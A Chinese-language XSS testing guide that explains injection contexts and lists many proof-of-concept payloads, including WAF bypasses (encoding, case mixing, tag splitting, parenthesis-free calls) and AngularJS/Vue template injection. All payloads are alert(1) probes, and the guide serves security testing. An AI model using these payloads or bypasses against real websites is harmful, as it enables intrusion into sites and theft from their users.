# XSS 跨站脚本攻击测试指南

## 一、XSS 类型

### 1. 反射型 XSS (Reflected XSS)

恶意脚本通过 URL 参数传入，服务器将其直接返回到页面：

**特点:**
- 非持久化，需要诱导用户点击恶意链接
- 常见于搜索框、错误消息、URL 参数回显

**示例场景:**
```
https://example.com/search?q=<script>alert(1)</script>
```

### 2. 存储型 XSS (Stored XSS)

恶意脚本被存储到服务器（数据库），其他用户访问时触发：

**特点:**
- 持久化，危害更大
- 常见于评论、留言板、用户资料

### 3. DOM 型 XSS (DOM-based XSS)

恶意脚本在客户端 JavaScript 中被处理执行：

**特点:**
- 不经过服务器
- 通过修改 DOM 环境触发
- 常见于使用 `document.write`, `innerHTML`, `eval` 等的页面

**危险的 DOM 操作:**
```javascript
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()
eval()
setTimeout()
setInterval()
new Function()
```

## 二、XSS 注入位置

### 1. HTML 上下文

#### 标签之间
```html
<div>用户输入</div>
```

**Payload:**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

#### 标签属性值
```html
<input value="用户输入">
```

**Payload:**
```html
" onclick=alert(1) x="
" onfocus=alert(1) autofocus="
"><script>alert(1)</script>
" onmouseover=alert(1) x="
```

#### 属性名
```html
<div 用户输入="value">
```

**Payload:**
```html
onclick=alert(1)
onmouseover=alert(1)
```

### 2. JavaScript 上下文

#### 字符串内
```javascript
var x = '用户输入';
```

**Payload:**
```javascript
';alert(1)//
';alert(1);'
\';alert(1)//
</script><script>alert(1)</script>
```

#### 模板字符串内
```javascript
var x = `用户输入`;
```

**Payload:**
```javascript
${alert(1)}
`+alert(1)+`
```

### 3. URL 上下文

#### href 属性
```html
<a href="用户输入">Link</a>
```

**Payload:**
```html
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

#### src 属性
```html
<iframe src="用户输入">
<script src="用户输入">
```

### 4. CSS 上下文

```html
<style>用户输入</style>
<div style="用户输入">
```

**Payload:**
```css
</style><script>alert(1)</script>
expression(alert(1))  /* IE only */
background:url(javascript:alert(1))  /* 旧浏览器 */
```

## 三、常用 XSS Payload

### 1. 基础测试 Payload

```html
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
```

### 2. 事件处理器 Payload

#### 鼠标事件
```html
<img src=x onerror=alert(1)>
<img src=x onerror="alert(1)">
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<object data=x onerror=alert(1)>
<embed src=x onerror=alert(1)>
```

#### 焦点事件
```html
<input onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
```

#### 表单事件
```html
<form onsubmit=alert(1)><input type=submit>
<form><button formaction=javascript:alert(1)>
<isindex action=javascript:alert(1) type=submit>
```

### 3. 无需用户交互的 Payload

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video autoplay onloadstart=alert(1) src=x>
<details open ontoggle=alert(1)>
```

### 4. JavaScript 伪协议

```html
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">
<form action="javascript:alert(1)"><input type=submit>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
```

### 5. Data URI

```html
<a href="data:text/html,<script>alert(1)</script>">click</a>
<iframe src="data:text/html,<script>alert(1)</script>">
<object data="data:text/html,<script>alert(1)</script>">
```

## 四、WAF/过滤绕过技术

### 1. 大小写混合

```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
```

### 2. 编码绕过

#### HTML 实体编码
```html
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">
```

#### 十六进制编码
```html
<img src=x onerror="\x61\x6c\x65\x72\x74\x28\x31\x29">
```

#### Unicode 编码
```html
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">
```

#### URL 编码
```html
<a href="javascript:%61%6c%65%72%74(1)">
```

#### Base64 编码
```html
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

### 3. 标签变形

```html
<script/src=x></script>
<script\x20src=x></script>
<script\x09src=x></script>
<script\x0Asrc=x></script>
<script\x0Csrc=x></script>
<script\x0Dsrc=x></script>
```

### 4. 属性分隔符变形

```html
<img src=x onerror=alert(1)>
<img src=x onerror='alert(1)'>
<img src=x onerror="alert(1)">
<img src=x onerror=`alert(1)`>  /* 某些浏览器 */
```

### 5. 关键字拆分

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src=x o<script></script>nerror=alert(1)>
```

### 6. 利用 SVG

```html
<svg><script>alert(1)</script></svg>
<svg onload=alert(1)>
<svg><animate onbegin=alert(1)>
<svg><set onbegin=alert(1)>
```

### 7. 利用 Math 标签

```html
<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">click</maction></math>
```

### 8. 无括号执行

```html
<script>alert`1`</script>
<script>onerror=alert;throw 1</script>
<script>{onerror=alert}throw 1</script>
<img src=x onerror=alert`1`>
```

### 9. 无引号执行

```html
<img src=x onerror=alert(1)>
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
```

## 五、特殊场景 Payload

### 1. JSON 上下文

```javascript
{"name":"</script><script>alert(1)</script>"}
{"name":"'-alert(1)-'"}
```

### 2. 回调函数

```
callback=alert(1)//
jsonp=alert(1)//
```

### 3. 文件上传 (SVG)

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">alert(1)</script>
</svg>
```

### 4. Content-Type 绕过

上传 `.html` 文件包含 XSS payload

### 5. AngularJS 模板注入

```
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```

### 6. Vue.js 模板注入

```
{{_c.constructor('alert(1)')()}}
```

## 六、响应分析

### 1. 确认 XSS 存在的标志

- 输入的 HTML 标签被原样返回
- JavaScript 代码被执行
- 事件处理器被触发
- 弹窗显示

### 2. 检测过滤规则

1. 测试基础标签 `<script>` 是否被过滤
2. 测试事件处理器 `onerror`, `onload` 是否被过滤
3. 测试 `javascript:` 伪协议是否被过滤
4. 测试编码后的 payload 是否生效
5. 测试大小写混合是否绕过

### 3. 确定输出位置

- HTML 标签之间
- HTML 属性值内
- JavaScript 代码内
- URL 参数内
- CSS 样式内

## 七、自动化测试建议

### 测试流程

1. **探测反射点**: 输入唯一标识符，检查是否在响应中出现
2. **确定上下文**: 分析输入出现在 HTML/JS/URL/CSS 的哪个位置
3. **测试过滤**: 尝试基础 payload，观察哪些被过滤
4. **构造绕过**: 根据过滤规则选择合适的绕过技术
5. **验证执行**: 确认 payload 成功执行

### 推荐测试顺序

```html
<!-- 1. 基础测试 -->
<script>alert(1)</script>

<!-- 2. 事件处理器 -->
<img src=x onerror=alert(1)>

<!-- 3. SVG -->
<svg onload=alert(1)>

<!-- 4. 编码绕过 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- 5. 大小写混合 -->
<ScRiPt>alert(1)</ScRiPt>

<!-- 6. 伪协议 -->
javascript:alert(1)
```

### Payload 优先级

1. **无需交互**: `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`
2. **简单交互**: `<a href=javascript:alert(1)>click</a>`
3. **复杂绕过**: 编码、变形、拆分等

